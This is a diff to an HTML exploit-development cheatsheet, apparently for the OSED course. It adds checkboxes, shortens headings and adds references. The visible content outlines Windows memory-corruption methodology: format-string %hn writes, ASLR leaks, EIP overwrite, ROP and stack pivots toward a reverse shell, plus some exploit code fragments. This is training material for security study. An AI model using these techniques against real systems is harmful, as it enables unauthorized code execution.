+        <li><input type="checkbox"> Format string: <code>[addr_lo][addr_hi]%[pad_lo]x%[off1]$hn%[pad_hi]x%[off2]$hn</code></li>
       </ul>
     </li>
   </ul>
@@ -2032,49 +2034,49 @@ def write_dword(target_addr, value, input_offset):
 
     return fmt</code></pre>
   <ul>
-    <li>Handle integer wraparound:
+    <li><input type="checkbox"> Handle integer wraparound:
       <ul>
-        <li>If the high word is smaller than the low word, add <code>0x10000</code> to the high word calculation</li>
-        <li>Always write the smaller value first, then the larger value</li>
-        <li>Test the write by targeting a visible memory location first</li>
+        <li><input type="checkbox"> If the high word is smaller than the low word, add <code>0x10000</code> to the high word calculation</li>
+        <li><input type="checkbox"> Always write the smaller value first, then the larger value</li>
+        <li><input type="checkbox"> Test the write by targeting a visible memory location first</li>
       </ul>
     </li>
   </ul>
 
 <h3 id="methodology-format-string-fmtstr-full-chain">1.10.3 Full Exploitation Chain</h3>
   <ul>
-    <li>Step 1: Leak to bypass ASLR:
+    <li><input type="checkbox"> Step 1: Leak to bypass ASLR:
       <ul>
-        <li>Use <code>%N$x</code> to read code pointers from the stack</li>
-        <li>Calculate module base from the leaked value</li>
-        <li>Calculate saved-EIP address and gadget addresses</li>
+        <li><input type="checkbox"> Use <code>%N$x</code> to read code pointers from the stack</li>
+        <li><input type="checkbox"> Calculate module base from the leaked value</li>
+        <li><input type="checkbox"> Calculate saved-EIP address and gadget addresses</li>
       </ul>
     </li>
-    <li>Step 2: Write the ROP chain start address over saved EIP:
+    <li><input type="checkbox"> Step 2: Write the ROP chain start address over saved EIP:
       <ul>
-        <li>Use <code>%hn</code> to write the low 2 bytes of the ROP gadget address to saved EIP</li>
-        <li>Use another <code>%hn</code> to write the high 2 bytes to saved EIP + 2</li>
-        <li>Alternatively: write a stack pivot gadget address (<code>xchg eax, esp; ret</code>)</li>
+        <li><input type="checkbox"> Use <code>%hn</code> to write the low 2 bytes of the ROP gadget address to saved EIP</li>
+        <li><input type="checkbox"> Use another <code>%hn</code> to write the high 2 bytes to saved EIP + 2</li>
+        <li><input type="checkbox"> Alternatively: write a stack pivot gadget address (<code>xchg eax, esp; ret</code>)</li>
       </ul>
     </li>
-    <li>Step 3: Trigger the return and execute the ROP chain:
+    <li><input type="checkbox"> Step 3: Trigger the return and execute the ROP chain:
       <ul>
-        <li>When the vulnerable function returns, EIP = your written address</li>
-        <li>ROP chain calls VirtualAlloc or WriteProcessMemory</li>
-        <li>Shellcode executes with RWX permissions &rarr; reverse shell</li>
+        <li><input type="checkbox"> When the vulnerable function returns, EIP = your written address</li>
+        <li><input type="checkbox"> ROP chain calls VirtualAlloc or WriteProcessMemory</li>
+        <li><input type="checkbox"> Shellcode executes with RWX permissions &rarr; reverse shell</li>
       </ul>
     </li>
-    <li>Stack pivot alternative for complex chains:
+    <li><input type="checkbox"> Stack pivot alternative for complex chains:
       <ul>
-        <li>Gadgets: <code>xchg eax, esp; ret</code>, <code>add esp, 0x200; ret</code>, <code>lea esp, [eax+N]; ret</code></li>
-        <li>Pivot the stack to a controlled buffer where the full ROP chain is laid out</li>
-        <li>Find pivot gadgets: <code>s -b 0 L?80000000 94 c3</code> (<code>XCHG EAX, ESP; RET</code>)</li>
+        <li><input type="checkbox"> Gadgets: <code>xchg eax, esp; ret</code>, <code>add esp, 0x200; ret</code>, <code>lea esp, [eax+N]; ret</code></li>
+        <li><input type="checkbox"> Pivot the stack to a controlled buffer where the full ROP chain is laid out</li>
+        <li><input type="checkbox"> Find pivot gadgets: <code>s -b 0 L?80000000 94 c3</code> (<code>XCHG EAX, ESP; RET</code>)</li>
       </ul>
     </li>
   </ul>
 <p><strong>References:</strong> <a href="https://www.corelan.be/index.php/articles/" target="_blank" rel="noopener noreferrer">Corelan tutorials</a> &middot; <a href="https://exploit-notes.hdks.org/" target="_blank" rel="noopener noreferrer">Exploit Notes</a></p>
 
-<ul><li><strong>General references:</strong> <a href="https://www.corelan.be/index.php/articles/" target="_blank" rel="noopener noreferrer">Corelan tutorials</a> &middot; <a href="https://www.exploit-db.com/" target="_blank" rel="noopener noreferrer">Exploit-DB</a> &middot; <a href="https://exploit-notes.hdks.org/" target="_blank" rel="noopener noreferrer">Exploit Notes</a></li></ul>
+<ul><li><input type="checkbox"> <strong>General references:</strong> <a href="https://www.corelan.be/index.php/articles/" target="_blank" rel="noopener noreferrer">Corelan tutorials</a> &middot; <a href="https://www.exploit-db.com/" target="_blank" rel="noopener noreferrer">Exploit-DB</a> &middot; <a href="https://exploit-notes.hdks.org/" target="_blank" rel="noopener noreferrer">Exploit Notes</a></li></ul>
 
 
 <h2 id="osed-x86">2. x86 Architecture</h2>
@@ -2357,7 +2359,7 @@ with socket.create_connection((TARGET, PORT)) as s:
               <!-- ============================================================ -->
               <!-- 5. Bad Characters & Return Addresses                         -->
               <!-- ============================================================ -->
-              <h2 id="osed-bad-chars">5. Bad Characters &amp; Return Addresses</h2>
+              <h2 id="osed-bad-chars">5. Bad Characters</h2>
               <ul>
                 <li>Bad characters are bytes the application transforms or truncates before they reach memory</li>
                 <li>Return address must come from a module without ASLR (and for SEH, without SafeSEH)</li>
@@ -2416,7 +2418,7 @@ lm                  # compare base addresses across reboots to confirm ASLR on/o
               <!-- ============================================================ -->
               <!-- 6. SEH-Based Overflows                                       -->
               <!-- ============================================================ -->
-              <h2 id="osed-seh-overflow">6. SEH-Based Overflows</h2>
+              <h2 id="osed-seh-overflow">6. SEH Overflows</h2>
               <ul>
                 <li>Overflow tramples a stack-resident <strong>exception registration record</strong> instead of a saved return address</li>
                 <li>Exploit by overwriting the handler pointer so the exception dispatcher transfers control to your gadget</li>
@@ -2501,7 +2503,7 @@ with socket.create_connection((TARGET, PORT)) as s:
               <!-- ============================================================ -->
               <!-- 7. Reverse Engineering                                       -->
               <!-- ============================================================ -->
-              <h2 id="osed-reversing">7. Reverse Engineering (IDA Pro &amp; Ghidra)</h2>
+              <h2 id="osed-reversing">7. Reverse Engineering</h2>
               <ul>
                 <li>Closed-source binaries require static reverse engineering to find the bug</li>
                 <li>IDA Pro is the course tool; Ghidra is a capable free alternative with integrated decompiler</li>
@@ -2618,7 +2620,7 @@ def build_packet(opcode: int, payload: bytes) -&gt; bytes:
               <!-- ============================================================ -->
               <!-- 8. Egghunters & Space Restrictions                           -->
               <!-- ============================================================ -->
-              <h2 id="osed-egghunter">8. Egghunters &amp; Space Restrictions</h2>
+              <h2 id="osed-egghunter">8. Egghunters</h2>
               <ul>
                 <li>When buffer after EIP or nSEH is too small for full shellcode</li>
                 <li>Drop a tiny egghunter that scans memory for an 8-byte tag prefixing real shellcode, then jumps to it</li>
@@ -2756,7 +2758,7 @@ EGG = b"w00tw00t"   # 8 bytes (egg repeated twice)
               <!-- ============================================================ -->
               <!-- 9. Creating Custom Shellcode                                 -->
               <!-- ============================================================ -->
-              <h2 id="osed-custom-shellcode">9. Creating Custom Shellcode</h2>
+              <h2 id="osed-custom-shellcode">9. Custom Shellcode</h2>
               <ul>
                 <li>Encoders can&rsquo;t always avoid every bad character or fit a tight space</li>
                 <li>Alternative: hand-written shellcode that resolves Win32 APIs at runtime from the PEB</li>
@@ -2909,7 +2911,7 @@ def main():
               <!-- ============================================================ -->
               <!-- 10. Bypassing DEP with ROP                                   -->
               <!-- ============================================================ -->
-              <h2 id="osed-dep-bypass">10. Bypassing DEP with ROP</h2>
+              <h2 id="osed-dep-bypass">10. DEP Bypass (ROP)</h2>
               <ul>
                 <li>DEP marks the stack non-executable &mdash; direct shellcode jumps fault</li>
                 <li>ROP chains existing executable code snippets ending in <code>RET</code> to call a Win32 API</li>
@@ -3048,7 +3050,7 @@ encoded = bytes(b ^ key for b in shellcode_raw)
               <!-- ============================================================ -->
               <!-- 11. Bypassing ASLR                                           -->
               <!-- ============================================================ -->
-              <h2 id="osed-aslr-bypass">11. Bypassing ASLR</h2>
+              <h2 id="osed-aslr-bypass">11. ASLR Bypass</h2>
               <ul>
                 <li>ASLR randomizes module bases each load</li>
                 <li>Bypass with a non-ASLR module, leak a runtime pointer to recompute the base, or partial overwrite</li>
@@ -3119,7 +3121,7 @@ x target!*diag*
               <!-- ============================================================ -->
               <!-- 12. Format String Attacks                                    -->
               <!-- ============================================================ -->
-              <h2 id="osed-format-string">12. Format String Attacks</h2>
+              <h2 id="osed-format-string">12. Format Strings</h2>
               <ul>
                 <li>When user input reaches a <code>printf</code>-family function as the <em>format string</em> itself</li>
                 <li>Format specifiers read from and write to memory</li>
@@ -3294,6 +3296,17 @@ def exploit():
     trigger_request()   # causes the function to return, executing our ROP chain
     print("[+] Reverse shell triggered")</code></pre>
 
+<h2 id="references">13. References</h2>
+<ul>
+<li><a href="https://www.offsec.com/courses/exp-301/" target="_blank" rel="noopener noreferrer">OffSec EXP-301 (OSED)</a></li>
+<li><a href="https://www.corelan.be/index.php/articles/" target="_blank" rel="noopener noreferrer">Corelan Exploit Writing Tutorials</a></li>
+<li><a href="https://book.hacktricks.xyz/" target="_blank" rel="noopener noreferrer">HackTricks</a></li>
+<li><a href="https://www.fuzzysecurity.com/tutorials.html" target="_blank" rel="noopener noreferrer">FuzzySecurity Tutorials</a></li>
+<li><a href="https://github.com/corelan/mona" target="_blank" rel="noopener noreferrer">mona.py</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/" target="_blank" rel="noopener noreferrer">Microsoft WinDbg Documentation</a></li>
+<li><a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener noreferrer">ROPgadget</a></li>
+</ul>
+
             </div>
           </div>
         </div>
@@ -3445,7 +3458,7 @@ def exploit():
       </div>
     </div>
     <div class="section-flow-5">
-      <button class="dropdown-btn">5. Bad Characters & Return Addresses
+      <button class="dropdown-btn">5. Bad Characters
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
@@ -3455,7 +3468,7 @@ def exploit():
       </div>
     </div>
     <div class="section-flow-6">
-      <button class="dropdown-btn">6. SEH-Based Overflows
+      <button class="dropdown-btn">6. SEH Overflows
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
@@ -3467,7 +3480,7 @@ def exploit():
       </div>
     </div>
     <div class="section-flow-7">
-      <button class="dropdown-btn">7. Reverse Engineering (IDA Pro & Ghidra)
+      <button class="dropdown-btn">7. Reverse Engineering
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
@@ -3480,7 +3493,7 @@ def exploit():
       </div>
     </div>
     <div class="section-flow-8">
-      <button class="dropdown-btn">8. Egghunters & Space Restrictions
+      <button class="dropdown-btn">8. Egghunters
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
@@ -3494,7 +3507,7 @@ def exploit():
       </div>
     </div>
     <div class="section-flow-9">
-      <button class="dropdown-btn">9. Creating Custom Shellcode
+      <button class="dropdown-btn">9. Custom Shellcode
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
@@ -3507,7 +3520,7 @@ def exploit():
       </div>
     </div>
     <div class="section-flow-10">
-      <button class="dropdown-btn">10. Bypassing DEP with ROP
+      <button class="dropdown-btn">10. DEP Bypass (ROP)
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
@@ -3520,7 +3533,7 @@ def exploit():
       </div>
     </div>
     <div class="section-flow-11">
-      <button class="dropdown-btn">11. Bypassing ASLR
+      <button class="dropdown-btn">11. ASLR Bypass
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
@@ -3532,7 +3545,7 @@ def exploit():
       </div>
     </div>
     <div class="section-flow-12">
-      <button class="dropdown-btn">12. Format String Attacks
+      <button class="dropdown-btn">12. Format Strings
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
@@ -3543,6 +3556,13 @@ def exploit():
         <a href="#osed-fstr-eip">12.5 Overwriting EIP & Redirecting Execution</a>
         <a href="#osed-fstr-pivot">12.6 Stack Pivot for ROP After Format String</a>
         <a href="#osed-fstr-rce">12.7 Getting Code Execution (Full Chain)</a>
+      </div>
+    </div>
+    <div class="section-flow-13">
+      <button class="dropdown-btn">13. References
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
       </div>
     </div>
   </div>
@@ -3587,6 +3607,7 @@ def exploit():
 
   <script defer src="js/site.js"></script>
   <script defer src="js/cheatsheet-index.js"></script>
+  <script defer src="js/methodology-checkboxes.js"></script>
 
 </body>
 
